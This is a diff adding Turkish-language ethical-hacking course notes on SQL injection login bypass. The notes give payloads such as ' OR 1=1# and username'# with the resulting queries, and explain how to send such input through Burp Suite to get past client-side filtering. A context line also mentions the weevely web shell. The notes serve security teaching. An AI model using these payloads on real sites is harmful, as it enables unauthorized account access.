@@ -892,9 +892,36 @@ weevely <fotoğrafın yüklendiği konum><password> -> .php dosyasını kullanar
 
 > ## SQL Şifre Girmeden Login Olma
 
+- ```SELECT * FROM account WHERE username='jamess' AND password='123456' OR 1=1#``` deniyoruz, yani;
+- Böyle durumlarda kullanıcı adının bir önemi yoktur id'si 1 olan kullanıcı olarak giriş yaparız ve genellikle bu kişi admin olur
 
+- | Kullanıcı Adı | jamess |
+  | --- | --- |
+  | Password | abcd' OR 1=1# |
+
+![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/a19f3a13fcf32da875e5621565e3147414b02156/Pictures/WhatsApp%20Image%202022-09-15%20at%2018.12.10.jpeg)
+
+- Bu sefer kullanıcı adı üzerinden işlem yapıyoruz ve ```SELECT * FROM account WHERE username='jamess'# AND password='abvdsb'``` deniyoruz, yani;
+
+- | Kullanıcı Adı | jamess'# |
+  | --- | --- |
+  | Password | avbc |
+
+![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/a19f3a13fcf32da875e5621565e3147414b02156/Pictures/WhatsApp%20Image%202022-09-15%20at%2018.06.51.jpeg)
 
 > ## Daha Güvenli Sitelerde SQL Açığı
+
+- ```Burpsuite``` kullanıyoruz 
+- ```Intercept is on``` yapıyoruz, siteye kullanıcı adı ve şifre giriyoruz
+- Eğer yolladığımız bilgiler engellenip burpsuite düşmüyorsa ```clientside``` kısmında kontrol ediliyor sunucuya gitmiyor demektir
+- Girmeyi denediğimiz fakat site tarafından engellenen şifreleri ```burpsuite -> parametre``` kısmından değiştirebilir ve öyle rahatça giriş yapabiliriz
+- Password kısmına ```1' OR 1=1#``` giriyoruz
+- Sitede filtreleme olmuş olsa bile bu yöntemle giriş yapabiliriz
+
+![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/a19f3a13fcf32da875e5621565e3147414b02156/Pictures/WhatsApp%20Image%202022-09-15%20at%2018.28.28.jpeg)
+
+![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/a19f3a13fcf32da875e5621565e3147414b02156/Pictures/WhatsApp%20Image%202022-09-15%20at%2018.32.14.jpeg)
+
 #SQL Get Methodu
 > ## SQL Union Select
 > ## SQL Sütun Sayısı Öğrenme
